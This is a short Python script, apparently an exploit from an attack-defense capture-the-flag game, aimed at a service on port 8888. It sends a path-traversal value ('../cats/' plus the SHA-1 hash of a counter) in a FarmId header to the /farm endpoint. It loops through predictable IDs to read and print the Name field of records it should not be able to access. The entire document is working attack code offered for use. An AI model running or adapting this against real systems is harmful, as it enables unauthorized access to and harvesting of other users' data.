import requests
import sys
import hashlib

for i in range(10000):
    try:
        print(requests.get(
            f"http://{sys.argv[1]}:8888/farm", headers={
                "FarmId": f"../cats/{hashlib.sha1(str(i).encode()).hexdigest()}"}
        ).json()["Name"])
    except:
        break